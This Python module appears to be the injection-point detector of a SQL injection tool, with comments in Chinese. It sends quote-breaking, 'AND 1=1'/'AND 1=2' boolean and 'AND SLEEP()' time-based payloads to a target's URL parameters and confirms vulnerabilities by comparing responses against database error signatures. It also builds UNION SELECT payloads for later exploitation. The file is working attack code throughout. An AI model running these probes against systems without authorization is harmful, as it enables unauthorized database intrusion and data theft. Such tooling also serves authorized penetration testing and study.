"""注入点检测：报错、布尔、时间三类信号交叉验证。"""

from __future__ import annotations

from dataclasses import dataclass, field

from .errors import NotExploitable
from .http_client import HttpClient
from .target import Target
from .utils import debug, info, similarity, success, warn

# 常见数据库/框架的报错特征
ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysqli",
    "sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "odbc sql server driver",
    "pg::syntaxerror",
    "postgresql",
    "sqlite3",
    "sqlite error",
    "ora-00933",
    "ora-01756",
    "microsoft ole db",
    "syntax error",
    "invalid query",
]

BOOLEAN_TOLERANCE = 0.03        # 真/假页面相似度差阈值
TIME_TOLERANCE = 0.7            # 实测耗时需达到 SLEEP 值的 70%


@dataclass
class Injection:
    param: str
    technique: str                  # error / boolean / time / union
    quote: str                      # '、" 或空
    prefix: str                     # 原始值，如 "1"
    comment: str = "-- -"
    evidence: list[str] = field(default_factory=list)

    def head(self) -> str:
        """payload 的公共前缀：原始值 + 闭合引号。"""
        return f"{self.prefix}{self.quote}"

    def tail(self) -> str:
        """payload 的公共后缀：行注释。"""
        return f" {self.comment}" if self.comment else ""

    def wrap(self, expression: str) -> str:
        """把注入表达式包成可在参数中使用的完整 payload。"""
        return f"{self.head()}{expression}{self.tail()}"

    def union_query(self, select_list: str) -> str:
        return self.wrap(f" UNION SELECT {select_list}")


def has_sql_error(text: str) -> bool:
    lowered = text.lower()
    return any(sig in lowered for sig in ERROR_SIGNATURES)


class Detector:
    def __init__(self, client: HttpClient, target: Target, delay: float = 3.0) -> None:
        self.client = client
        self.target = target
        self.delay = delay
        self.baseline: str = ""

    def _fetch(self, param: str, value: str):
        return self.client.get(self.target.build(param, value))

    def run(self, param: str) -> Injection | None:
        self.baseline = self._fetch(param, self.target.get_value(param)).text
        info(f"测试参数：{param}")

        # 1) 报错型：闭合引号后触发语法错误
        for quote in ("'", '"'):
            probe = self.target.get_value(param) + quote
            resp = self._fetch(param, probe)
            if has_sql_error(resp.text) and not has_sql_error(self.baseline):
                success(f"参数 {param} 存在 SQL 注入（报错型，引号 {quote}）")
                return Injection(param=param, technique="error", quote=quote,
                                 prefix=self.target.get_value(param),
                                 evidence=[f"payload={probe}", "响应出现数据库报错信息"])

        # 2) 布尔型：真条件与假条件页面明显不同
        for quote in ("'", '"'):
            prefix = self.target.get_value(param)
            true_v = f"{prefix}{quote} AND 1=1-- -"
            false_v = f"{prefix}{quote} AND 1=2-- -"
            true_resp = self._fetch(param, true_v)
            false_resp = self._fetch(param, false_v)
            sim_true = similarity(self.baseline, true_resp.text)
            sim_false = similarity(self.baseline, false_resp.text)
            debug(f"布尔探测 quote={quote!r} sim_true={sim_true:.3f} sim_false={sim_false:.3f}")
            if has_sql_error(false_resp.text) and not has_sql_error(self.baseline):
                continue
            if sim_true >= 0.90 and sim_true - sim_false >= BOOLEAN_TOLERANCE:
                success(f"参数 {param} 存在 SQL 注入（布尔型，引号 {quote}）")
                return Injection(param=param, technique="boolean", quote=quote, prefix=prefix,
                                 evidence=[f"true={true_v}", f"false={false_v}",
                                           f"相似度 true={sim_true:.3f} false={sim_false:.3f}"])

        # 3) 时间型：SLEEP 使响应明显延迟
        for quote in ("'", '"'):
            prefix = self.target.get_value(param)
            sleep_v = f"{prefix}{quote} AND SLEEP({self.delay:g})-- -"
            resp = self._fetch(param, sleep_v)
            debug(f"时间探测 quote={quote!r} elapsed={resp.elapsed:.2f}s")
            if resp.elapsed >= self.delay * TIME_TOLERANCE:
                success(f"参数 {param} 存在 SQL 注入（时间型，引号 {quote}）")
                return Injection(param=param, technique="time", quote=quote, prefix=prefix,
                                 evidence=[f"payload={sleep_v}", f"响应耗时 {resp.elapsed:.2f}s"])

        warn(f"参数 {param} 未发现明显 SQL 注入特征")
        return None

    def scan(self, params: list[str] | None = None) -> Injection:
        """依次测试候选参数，返回第一个确认的注入点。"""
        candidates = params or self.target.candidate_params()
        info(f"候选参数：{', '.join(candidates)}")
        for param in candidates:
            injection = self.run(param)
            if injection:
                return injection
        raise NotExploitable("所有候选参数均未检测到 SQL 注入")
